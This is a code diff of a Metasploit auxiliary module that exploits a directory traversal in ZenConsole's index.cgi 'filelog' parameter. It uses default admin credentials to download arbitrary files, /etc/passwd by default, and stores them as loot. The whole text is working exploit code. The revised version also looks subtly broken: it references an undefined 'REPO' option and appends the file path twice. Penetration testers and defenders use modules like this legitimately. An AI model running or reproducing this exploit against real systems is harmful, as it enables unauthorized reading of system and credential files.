@@ -32,51 +32,42 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::RPORT(444),
         OptInt.new('DEPTH', [true, 'The max traversal depth', 16]),
-        OptString.new('FILEPATH', [false, 'The name of the file to download', 'etc/passwd']),
+        OptString.new('FILEPATH', [false, 'The name of the file to download', '/etc/passwd']),
         OptString.new('TARGETURI', [true, "The base URI path of the ZenConsole install", '/']),
         OptString.new('HttpUsername', [true, 'The username to use for the HTTP server', 'admin']),
         OptString.new('HttpPassword', [false, 'The password to use for the HTTP server', 'admin']),
       ])
   end
 
-  def run
-    if datastore['FILEPATH'].nil? || datastore['FILEPATH'].empty?
-      print_error("Please supply the name of the file you want to download")
-      return
-    end
+  def run_host(ip)
+    filename = datastore['FILEPATH']
+    traversal = "../" * datastore['DEPTH'] << filename
 
-    traversal = "../" * datastore['DEPTH']
-    begin
-      res = send_request_raw({
-        'method' => 'GET',
-        'uri'    => "/index.cgi?id=2-3&filelog=#{traversal}#{datastore['FILEPATH']}&nlines=100&action=See+logs",
-        'authorization' => basic_auth(datastore['HttpUsername'],datastore['HttpPassword'])
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, datastore['REPO'], 'index.cgi'),
+      'vars_get'=> {
+      'id'      => '2-3',
+      'filelog' => "#{traversal}#{datastore['FILEPATH']}",
+      'nlines'  => '100',
+      'action'  => 'See+logs'
+                   },
+      'authorization' => basic_auth(datastore['HttpUsername'],datastore['HttpPassword'])
       }, 25)
-    rescue Rex::ConnectionRefused
-      print_error("#{rhost}:#{rport} Could not connect.")
+
+    unless res && res.code == 200
+      print_error('Nothing was downloaded')
       return
     end
 
-    if res
-      if res.code == 200
-        vprint_line(res.to_s)
-        fname = File.basename(datastore['FILEPATH'])
-
-        path = store_loot(
-          'zenload.http',
-          'text/plain',
-          datastore['RHOST'],
-          res.body,
-          fname
-        )
-        print_good("File saved in: #{path}")
-      elsif res.code == 401
-        print_error("#{rhost}:#{rport} Authentication failed")
-      elsif res.code == 404
-        print_error("#{rhost}:#{rport} File not found")
-      end
-    else
-      print_error("HTTP Response failed")
-    end
+    vprint_good("#{peer} - \n#{res.body}")
+    path = store_loot(
+      'zenload.http',
+      'text/plain',
+      ip,
+      res.body,
+      filename
+    )
+    print_good("File saved in: #{path}")
   end
 end
